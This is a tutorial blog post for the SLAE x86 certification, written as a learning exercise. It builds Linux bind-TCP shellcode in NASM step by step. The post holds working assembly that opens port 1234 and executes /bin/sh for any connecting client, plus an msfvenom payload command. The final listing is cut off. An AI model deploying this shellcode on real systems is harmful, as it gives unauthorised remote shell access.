<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<script type=text/javascript src=https://latest.cactus.chat/cactus.js></script>
<link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> SLAE x86 - Assignment 0x1 | jsn></title>
<link rel=canonical href=https://jsnv.dev/posts/slae_x86_a1/>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content="SLAE x86 - Assignment 0x1">
<meta property="og:description" content="Bind TCP Shellcode Objectives  Create a shell bind tcp shellcode  Binds	to a port Execs	shell	on incoming	connection   Port number should be easily configurable  Structure Using bind shell from msfvenom, the needed syscalls can be visualize with the help of libemu's sctest and dot tool:
Generated using:
msfvenom --arch x86 --platform linux -p linux/x86/shell_bind_tcp -f raw | sctest -vvv -Ss 10000 -G bind_tcp_shellcode.dot dot bind_tcp_shellcode.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://jsnv.dev/posts/slae_x86_a1/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-18T05:50:49+00:00">
<meta property="article:modified_time" content="2021-10-18T05:50:49+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="SLAE x86 - Assignment 0x1">
<meta name=twitter:description content="Bind TCP Shellcode Objectives  Create a shell bind tcp shellcode  Binds	to a port Execs	shell	on incoming	connection   Port number should be easily configurable  Structure Using bind shell from msfvenom, the needed syscalls can be visualize with the help of libemu's sctest and dot tool:
Generated using:
msfvenom --arch x86 --platform linux -p linux/x86/shell_bind_tcp -f raw | sctest -vvv -Ss 10000 -G bind_tcp_shellcode.dot dot bind_tcp_shellcode.">
<link rel=stylesheet href=https://jsnv.dev/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://jsnv.dev/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>~/</a></li>
<li><a href=/posts>~/posts</a></li>
<li><a href=/tags>~/tags</a></li>
<li><a href=/about>~/about</a></li>
<li><a href=/work>~/work</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://jsnv.dev/posts/slae_x86/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=https://jsnv.dev/posts/slae_x86_a2/ aria-label=Next>
<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&text=SLAE%20x86%20-%20Assignment%200x1" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&title=SLAE%20x86%20-%20Assignment%200x1" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x1" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x1&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&title=SLAE%20x86%20-%20Assignment%200x1" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&title=SLAE%20x86%20-%20Assignment%200x1" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&name=SLAE%20x86%20-%20Assignment%200x1&description=Bind%20TCP%20Shellcode%20Objectives%20%20Create%20a%20shell%20bind%20tcp%20shellcode%20%20Binds%09to%20a%20port%20Execs%09shell%09on%20incoming%09connection%20%20%20Port%20number%20should%20be%20easily%20configurable%20%20Structure%20Using%20bind%20shell%20from%20msfvenom%2c%20the%20needed%20syscalls%20can%20be%20visualize%20with%20the%20help%20of%20libemu%27s%20sctest%20and%20dot%20tool%3a%0aGenerated%20using%3a%0amsfvenom%20--arch%20x86%20--platform%20linux%20-p%20linux%2fx86%2fshell_bind_tcp%20-f%20raw%20%7c%20sctest%20-vvv%20-Ss%2010000%20-G%20bind_tcp_shellcode.dot%20dot%20bind_tcp_shellcode." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&t=SLAE%20x86%20-%20Assignment%200x1" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents>
<ul>
<li><a href=#objectives>Objectives</a></li>
<li><a href=#structure>Structure</a></li>
<li><a href=#creating-the-nasm-code>Creating the NASM Code</a>
<ul>
<li><a href=#syscalls-and-other-values>Syscalls and other values</a></li>
<li><a href=#socket2>Socket(2)</a></li>
<li><a href=#bind2>Bind(2)</a></li>
<li><a href=#listen2>Listen(2)</a></li>
<li><a href=#accept42>Accept4(2)</a></li>
<li><a href=#dup2>Dup(2)</a></li>
<li><a href=#execve2>Execve(2)</a></li>
</ul>
</li>
<li><a href=#final-nasm-code>Final NASM Code</a></li>
<li><a href=#dynamic-configuration>Dynamic Configuration</a>
<ul>
<li><a href=#script-usage-and-shellcode-testing>Script usage and shellcode testing</a></li>
</ul>
</li>
</ul>
</nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
SLAE x86 - Assignment 0x1
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2021-10-18 05:50:49 +0000 UTC" itemprop=datePublished>2021-10-18</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
7 minute read
</div>
<div class=article-category>
<i class="fas fa-archive"></i>
<a class=category-link href=/categories/certification>certification</a>
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/exploit_dev rel=tag>exploit_dev</a>
,
<a class=tag-link href=/tags/assembly rel=tag>assembly</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<h1 id=bind-tcp-shellcode>Bind TCP Shellcode</h1>
<h2 id=objectives>Objectives</h2>
<ul>
<li>Create a shell bind tcp shellcode
<ul>
<li>Binds to a port</li>
<li>Execs shell on incoming connection</li>
</ul>
</li>
<li>Port number should be easily configurable</li>
</ul>
<h2 id=structure>Structure</h2>
<p>Using bind shell from msfvenom, the needed syscalls can be visualize with the help of <a href=https://github.com/buffer/libemu><code>libemu's sctest</code></a> and <a href=https://graphviz.org/><code>dot tool</code></a>:</p>
<p><img src=bind_tcp_shellcode.png alt></p>
<p>Generated using:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh>msfvenom --arch x86 --platform linux -p linux/x86/shell_bind_tcp -f raw <span class=p>|</span> sctest -vvv -Ss <span class=m>10000</span> -G bind_tcp_shellcode.dot
dot bind_tcp_shellcode.dot -T png -o bind_tcp_shellcode.png
</code></pre></div><h2 id=creating-the-nasm-code>Creating the NASM Code</h2>
<h3 id=syscalls-and-other-values>Syscalls and other values</h3>
<ul>
<li>Below are the needed syscalls and respective opcodes from <code>/usr/include/asm/unistd_32.h</code></li>
</ul>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>  <span class=no>SOCKET</span><span class=kd>      equ</span> <span class=mh>0x167</span>
  <span class=no>BIND</span><span class=kd>        equ</span> <span class=mh>0x169</span>
  <span class=no>LISTEN</span><span class=kd>      equ</span> <span class=mh>0x16b</span>
  <span class=no>ACCEPT</span><span class=kd>      equ</span> <span class=mh>0x16c</span>
  <span class=no>DUP</span><span class=kd>         equ</span> <span class=mh>0x3f</span>
  <span class=no>EXECVE</span><span class=kd>      equ</span> <span class=mh>0xb</span>
</code></pre></div><ul>
<li>These are declared under <code>section .text</code> for better reading of the nasm code together with other constants:</li>
</ul>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>  <span class=c1>; settings</span>
  <span class=no>PORT</span><span class=kd>        equ</span> <span class=mh>0xd204</span>        <span class=c1>; default 1234</span>

  <span class=c1>; argument constants</span>
  <span class=no>AF_INET</span><span class=kd>     equ</span> <span class=mh>0x2</span>
  <span class=no>SOCK_STREAM</span><span class=kd> equ</span> <span class=mh>0x1</span>
</code></pre></div><h3 id=socket2>Socket(2)</h3>
<ul>
<li>This will create an endpoint for communication and returns a file descriptor that refers the endpoint.
The usage are detailed in: <a href=https://man7.org/linux/man-pages/man2/socket.2.html>https://man7.org/linux/man-pages/man2/socket.2.html</a></li>
<li>Synopsis: <code>socket(int domain, int type, int protocol)</code></li>
<li>Syscall arguments:
<ul>
<li>ebx: AF_INET = 2</li>
<li>ecx: SOCK_STREAM = 1</li>
<li>edx: IPPROTO_IP = 6</li>
</ul>
</li>
</ul>
<p>NASM Code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>  <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>SOCKET</span>
  <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=nv>AF_INET</span>
  <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=nv>SOCK_STREAM</span>
  <span class=nf>mov</span> <span class=nb>dl</span><span class=p>,</span> <span class=mh>0x6</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=bind2>Bind(2)</h3>
<ul>
<li>This will assign an address to the socket referred to by the file descriptor returned from <a href=#socket2>Socket(2)</a>.
The usage are detailed in: <a href=https://man7.org/linux/man-pages/man2/bind.2.html>https://man7.org/linux/man-pages/man2/bind.2.html</a></li>
<li>Synopsis: <code>bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)</code></li>
<li>Syscall arguments:
<ul>
<li>ebx: sockfd = eax(returned from previous syscall)</li>
<li>ecx: sockaddr = { AF_INET; PORT; 0x0; 0x0 }
<ul>
<li>AF_INET = 2</li>
<li>PORT = 1234</li>
</ul>
</li>
<li>edx: addrlen = 16</li>
</ul>
</li>
</ul>
<p>NASM Code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm> <span class=nf>xchg</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>
 <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
 <span class=nf>mul</span> <span class=nb>ecx</span>
 <span class=nf>push</span> <span class=nb>ecx</span>
 <span class=nf>push</span> <span class=nb>ecx</span>
 <span class=nf>push</span> <span class=nb>ecx</span>
 <span class=nf>mov</span> <span class=kt>byte</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=nv>AF_INET</span>
 <span class=nf>mov</span> <span class=kt>word</span> <span class=p>[</span><span class=nb>esp</span> <span class=o>+</span> <span class=mh>0x2</span><span class=p>],</span> <span class=nv>PORT</span>
 <span class=nf>push</span> <span class=nb>esp</span>
 <span class=nf>pop</span> <span class=nb>ecx</span>
 <span class=nf>push</span> <span class=mh>0x10</span>
 <span class=nf>pop</span> <span class=nb>edx</span>
 <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>edi</span>
 <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>BIND</span>
 <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=listen2>Listen(2)</h3>
<ul>
<li>This will mark the sockfd accept incoming connection requests using <a href=#accept2>Accept(2)</a>.
The usage are detailed in: <a href=https://man7.org/linux/man-pages/man2/listen.2.html>https://man7.org/linux/man-pages/man2/listen.2.html</a></li>
<li>Synopsis: <code>listen(int sockfd, int backlog)</code></li>
<li>Syscall arguments:
<ul>
<li>ebx: sockfd = edi(same sockfd used by last syscall)</li>
<li>ecx: backlog = 0x0(does not need to grow the sockfd for pending connections)</li>
</ul>
</li>
</ul>
<p>NASM Code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm> <span class=c1>; ebx already contain the sockfd from previous syscall</span>
 <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
 <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>LISTEN</span>
 <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=accept42>Accept4(2)</h3>
<ul>
<li>This will extract the first connection request for listening socket from <a href=#listen2>Listen(2)</a> then creates a new connected socket, and returns a new file descriptor referring to that socket.
The usage are detailed in: <a href=https://linux.die.net/man/2/accept4>https://linux.die.net/man/2/accept4</a></li>
<li>Synopsis: <code>accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);</code></li>
<li>Syscall arguments:
<ul>
<li>ebx: sockfd = edi(same sockfd used by last syscall)</li>
<li>ecx: sockaddr = 0x0</li>
<li>edx: addrlen = 0x0</li>
<li>esi: flags = 0x0</li>
</ul>
</li>
</ul>
<p>NASM Code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm> <span class=c1>; ebx already contain the sockfd from previous syscall</span>
 <span class=nf>mov</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>ecx</span>
 <span class=nf>xor</span> <span class=nb>esi</span><span class=p>,</span> <span class=nb>esi</span>
 <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>ACCEPT</span>
 <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=dup2>Dup(2)</h3>
<ul>
<li>This will allocate the file descriptors, virtual handles used to access certain process I/O operations and to simulate remote user&rsquo;s input and display to the terminal.
The usage are detailed in: <a href=https://man7.org/linux/man-pages/man2/dup.2.html>https://man7.org/linux/man-pages/man2/dup.2.html</a></li>
<li>Synopsis: <code>dup(int oldfd, int newfd, int flags)</code></li>
<li>Syscall arguments:
<ul>
<li>ebx: sockfd = eax(returned sockfd from <a href=#accept42>Accept4(2)</a>)</li>
<li>ecx: sockaddr = stdin, stdout, and stderr
<ul>
<li>stdin = 0x0</li>
<li>stdout = 0x1</li>
<li>stderr = 0x2</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>NASM Code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm> <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>eax</span> <span class=c1>; ebx = new sockfd</span>
 <span class=nf>push</span> <span class=mh>0x3</span>
 <span class=nf>pop</span> <span class=nb>ecx</span>
<span class=nl>loop:</span>
 <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
 <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=nv>DUP</span>
 <span class=nf>dec</span> <span class=nb>ecx</span>
 <span class=nf>int</span> <span class=mh>0x80</span>
 <span class=nf>jne</span> <span class=nv>loop</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=execve2>Execve(2)</h3>
<ul>
<li>This will execute the <code>/bin/sh</code> program on the remote machine
The usage are detailed in: <a href=https://man7.org/linux/man-pages/man2/execve.2.html>https://man7.org/linux/man-pages/man2/execve.2.html</a></li>
<li>Synopsis: <code>execve(const char *pathname, char *const argv[], char *const envp[])</code></li>
<li>Syscall arguments:
<ul>
<li>ebx: pathname = &lsquo;bin//sh&rsquo; address in stack</li>
<li>ecx: argv = 0x0</li>
<li>ecx: envp = 0x0</li>
</ul>
</li>
</ul>
<p>NASM Code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm> <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>
 <span class=nf>mul</span> <span class=nb>ebx</span>
 <span class=nf>push</span> <span class=nb>ebx</span>
 <span class=nf>push</span> <span class=mh>0x68732f2f</span>
 <span class=nf>push</span> <span class=mh>0x6e69622f</span>
 <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
 <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=nv>EXECVE</span>
 <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h2 id=final-nasm-code>Final NASM Code</h2>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=c1>; Purpose: Bind TCP shellcode</span>

<span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>
  <span class=c1>; settings</span>
  <span class=no>PORT</span><span class=kd>        equ</span> <span class=mh>0xd204</span>        <span class=c1>; default 1234</span>

  <span class=c1>; syscall kernel opcodes found in /usr/include/asm/unistd_32.h</span>
  <span class=no>SOCKET</span><span class=kd>      equ</span> <span class=mh>0x167</span>
  <span class=no>BIND</span><span class=kd>        equ</span> <span class=mh>0x169</span>
  <span class=no>LISTEN</span><span class=kd>      equ</span> <span class=mh>0x16b</span>
  <span class=no>ACCEPT</span><span class=kd>      equ</span> <span class=mh>0x16c</span>
  <span class=no>DUP</span><span class=kd>         equ</span> <span class=mh>0x3f</span>
  <span class=no>EXECVE</span><span class=kd>      equ</span> <span class=mh>0xb</span>

  <span class=c1>; argument constants</span>
  <span class=no>AF_INET</span><span class=kd>     equ</span> <span class=mh>0x2</span>
  <span class=no>SOCK_STREAM</span><span class=kd> equ</span> <span class=mh>0x1</span>

<span class=nl>_start:</span>
  <span class=c1>; clear registers</span>
  <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
  <span class=nf>mul</span> <span class=nb>ecx</span>

  <span class=c1>; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</span>
  <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>SOCKET</span>
  <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=nv>AF_INET</span>
  <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=nv>SOCK_STREAM</span>
  <span class=nf>mov</span> <span class=nb>dl</span><span class=p>,</span> <span class=mh>0x6</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                            <span class=c1>; syscall socket(2)</span>

  <span class=c1>; bind(sockfd, &amp;sockaddr, 16)</span>
  <span class=c1>; sockaddr = {AF_INET; PORT}</span>
  <span class=nf>xchg</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>                       <span class=c1>; edi = sockfd</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>                        <span class=c1>; clear ecx</span>
  <span class=nf>mul</span> <span class=nb>ecx</span>                             <span class=c1>; clear eax and edx</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                            <span class=c1>; 0x0</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                            <span class=c1>; 0x0</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                            <span class=c1>; 0x0; this will be overwritten by the next two instructions</span>
  <span class=nf>mov</span> <span class=kt>byte</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=nv>AF_INET</span>             <span class=c1>; esp = 0x00000002</span>
  <span class=nf>mov</span> <span class=kt>word</span> <span class=p>[</span><span class=nb>esp</span> <span class=o>+</span> <span class=mh>0x2</span><span class=p>],</span> <span class=nv>PORT</span>          <span class=c1>; esp = 0xd2040002</span>
  <span class=nf>push</span> <span class=nb>esp</span>                            <span class=c1>; push sockaddr</span>
  <span class=nf>pop</span> <span class=nb>ecx</span>                             <span class=c1>; ecx = &amp;sockadddr</span>
  <span class=nf>push</span> <span class=mh>0x10</span>                           <span class=c1>; 16</span>
  <span class=nf>pop</span> <span class=nb>edx</span>                             <span class=c1>; edx = 16</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>edi</span>                        <span class=c1>; ebx = sockfd</span>
  <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>BIND</span>                        <span class=c1>; bind(2)</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                            <span class=c1>; syscall bind(2)</span>

  <span class=c1>; listen(sockfd, 0)                 ; ebx already contain the sockfd from previous syscall</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>                        <span class=c1>; clear ecx</span>
  <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>LISTEN</span>                      <span class=c1>; listen(2)</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                            <span class=c1>; syscall listen(2)</span>

  <span class=c1>; accept(sockfd, NULL, NULL, NULL)  ; ebx already contain the sockfd from previous syscall</span>
  <span class=nf>mov</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>ecx</span>                        <span class=c1>; clear edx</span>
  <span class=nf>xor</span> <span class=nb>esi</span><span class=p>,</span> <span class=nb>esi</span>                        <span class=c1>; clear esi</span>
  <span class=nf>mov</span> <span class=nb>ax</span><span class=p>,</span> <span class=nv>ACCEPT</span>                      <span class=c1>; accept4(2)</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                            <span class=c1>; syscall accept4(2)</span>

  <span class=c1>; dup(sockfd, fd)</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>eax</span>                        <span class=c1>; ebx = new sockfd</span>
  <span class=nf>push</span> <span class=mh>0x3</span>                            <span class=c1>; prepare esp for ecx</span>
  <span class=nf>pop</span> <span class=nb>ecx</span>                             <span class=c1>; ecx = 0x3</span>
<span class=nl>loop:</span>
  <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>                        <span class=c1>; clear eax</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=nv>DUP</span>                         <span class=c1>; dup(2)</span>
  <span class=nf>dec</span> <span class=nb>ecx</span>                             <span class=c1>; decrement ecx to cover all 0x2, 0x1, and 0x0 fds</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                            <span class=c1>; syscall dup(2)</span>
  <span class=nf>jne</span> <span class=nv>loop</span>                            <span class=c1>; loop until ecx is zero</span>

  <span class=c1>; execve(&#39;/bin//sh&#39;, NULL, NULL)</span>
  <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>                        <span class=c1>; clear ebx</span>
  <span class=nf>mul</span> <span class=nb>ebx</span>                             <span class=c1>; clear eax and edx</span>
